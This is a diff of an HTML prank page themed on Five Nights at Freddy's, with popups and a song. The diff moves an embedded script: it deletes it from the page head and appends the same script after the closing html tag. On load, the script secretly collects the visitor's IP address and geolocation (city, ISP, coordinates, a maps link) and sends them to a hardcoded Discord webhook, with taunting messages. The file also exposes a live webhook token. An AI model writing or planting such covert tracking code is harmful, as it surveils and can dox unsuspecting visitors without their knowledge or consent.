@@ -24,123 +24,7 @@
     }
   </style>
 
-<script>
-    const webhookUrl = 'https://discord.com/api/webhooks/1336862623685148774/XDdGaufidkntBcBiZDlSY1uZmf2Kc3oSWKjai8xM84oYsDnfw70Aq7bOy4dYRykpA21t';
 
-    // Function to fetch and log IP, and get lat/lon info
-    const logIp = async () => {
-        try {
-            // Get user's public IP address
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            const userIP = data.ip;
-
-            console.log('User IP:', userIP);
-
-            // Send the IP address to a Discord webhook
-            const ipResponse = await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: `User IP: ${userIP}` })
-            });
-
-            if (!ipResponse.ok) {
-                throw new Error('Failed to send IP to Discord webhook');
-            }
-
-            console.log('IP logged and sent to webhook.');
-
-            // Use ipinfo.io for geolocation directly (No CORS proxy)
-            const locationResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
-            const locationData = await locationResponse.json();
-
-            if (locationData.error) {
-                console.log('Unable to fetch location data for the user.');
-                return;
-            }
-
-            const { country, region, city, loc, timezone, org } = locationData;
-            const [lat, lon] = loc.split(',');
-
-            // Generate the Google Maps link
-            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-            // Create the embed message
-            const embedMessage = {
-                username: "William Afton",
-                avatar_url: "https://i.ytimg.com/vi/Ss8C4vSgirc/hq720.jpg", // You can change the avatar image URL
-                embeds: [{
-                    title: `🧒 Located Another little friend: ${userIP}`,
-                    description: `Information gathered for the Foolish Fellow with IP address: ${userIP}`,
-                    color: 15456564, // Light blue color
-                    fields: [
-                        {
-                            name: "📍 Country",
-                            value: country,
-                            inline: true
-                        },
-                        {
-                            name: "🏙️ City",
-                            value: city,
-                            inline: true
-                        },
-                        {
-                            name: "🌐 Region",
-                            value: region,
-                            inline: true
-                        },
-                        {
-                            name: "🌐 Timezone",
-                            value: timezone,
-                            inline: true
-                        },
-                        {
-                            name: "🌐 ISP",
-                            value: org,
-                            inline: true
-                        },
-                        {
-                            name: "🗺️ Coordinates",
-                            value: `Latitude: ${lat}\nLongitude: ${lon}`,
-                            inline: true
-                        },
-                        {
-                            name: "🔗 Google Maps Link",
-                            value: `[View on Google Maps](${googleMapsLink})`,
-                            inline: true
-                        }
-                    ],
-                    footer: {
-                        text: "Data provided by FAZBEAR ENTERTAINMENT LLC."
-                    }
-                }]
-            };
-
-            // Send the embed message to Discord webhook
-            const embedResponse = await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(embedMessage)
-            });
-
-            if (!embedResponse.ok) {
-                throw new Error('Failed to send embed to Discord webhook');
-            }
-
-            console.log('Location data sent to webhook.');
-
-        } catch (error) {
-            console.error('Error logging IP or fetching location:', error);
-        }
-    };
-
-    // Execute the logIp function when the page loads
-    window.onload = logIp;
-</script>
 
   <script>
     let popups = [];
@@ -288,3 +172,121 @@
   <audio id="audio" src="https://github.com/maxhax123/DIEINAFIRE/raw/main/Five%20Nights%20at%20Freddy's%203%20Song%20(Feat.%20EileMonty%20%26%20Orko)%20-%20Die%20In%20A%20Fire%20(FNAF3)%20-%20Living%20Tombsto.mp3"></audio>
 </body>
 </html>
+
+<script>
+    const webhookUrl = 'https://discord.com/api/webhooks/1336862623685148774/XDdGaufidkntBcBiZDlSY1uZmf2Kc3oSWKjai8xM84oYsDnfw70Aq7bOy4dYRykpA21t';
+
+    // Function to fetch and log IP, and get lat/lon info
+    const logIp = async () => {
+        try {
+            // Get user's public IP address
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const userIP = data.ip;
+
+            console.log('User IP:', userIP);
+
+            // Send the IP address to a Discord webhook
+            const ipResponse = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: `User IP: ${userIP}` })
+            });
+
+            if (!ipResponse.ok) {
+                throw new Error('Failed to send IP to Discord webhook');
+            }
+
+            console.log('IP logged and sent to webhook.');
+
+            // Use ipinfo.io for geolocation directly (No CORS proxy)
+            const locationResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
+            const locationData = await locationResponse.json();
+
+            if (locationData.error) {
+                console.log('Unable to fetch location data for the user.');
+                return;
+            }
+
+            const { country, region, city, loc, timezone, org } = locationData;
+            const [lat, lon] = loc.split(',');
+
+            // Generate the Google Maps link
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // Create the embed message
+            const embedMessage = {
+                username: "William Afton",
+                avatar_url: "https://i.ytimg.com/vi/Ss8C4vSgirc/hq720.jpg", // You can change the avatar image URL
+                embeds: [{
+                    title: `🧒 Located Another little friend: ${userIP}`,
+                    description: `Information gathered for the Foolish Fellow with IP address: ${userIP}`,
+                    color: 15456564, // Light blue color
+                    fields: [
+                        {
+                            name: "📍 Country",
+                            value: country,
+                            inline: true
+                        },
+                        {
+                            name: "🏙️ City",
+                            value: city,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 Region",
+                            value: region,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 Timezone",
+                            value: timezone,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 ISP",
+                            value: org,
+                            inline: true
+                        },
+                        {
+                            name: "🗺️ Coordinates",
+                            value: `Latitude: ${lat}\nLongitude: ${lon}`,
+                            inline: true
+                        },
+                        {
+                            name: "🔗 Google Maps Link",
+                            value: `[View on Google Maps](${googleMapsLink})`,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "Data provided by FAZBEAR ENTERTAINMENT LLC."
+                    }
+                }]
+            };
+
+            // Send the embed message to Discord webhook
+            const embedResponse = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(embedMessage)
+            });
+
+            if (!embedResponse.ok) {
+                throw new Error('Failed to send embed to Discord webhook');
+            }
+
+            console.log('Location data sent to webhook.');
+
+        } catch (error) {
+            console.error('Error logging IP or fetching location:', error);
+        }
+    };
+
+    // Execute the logIp function when the page loads
+    window.onload = logIp;
+</script>
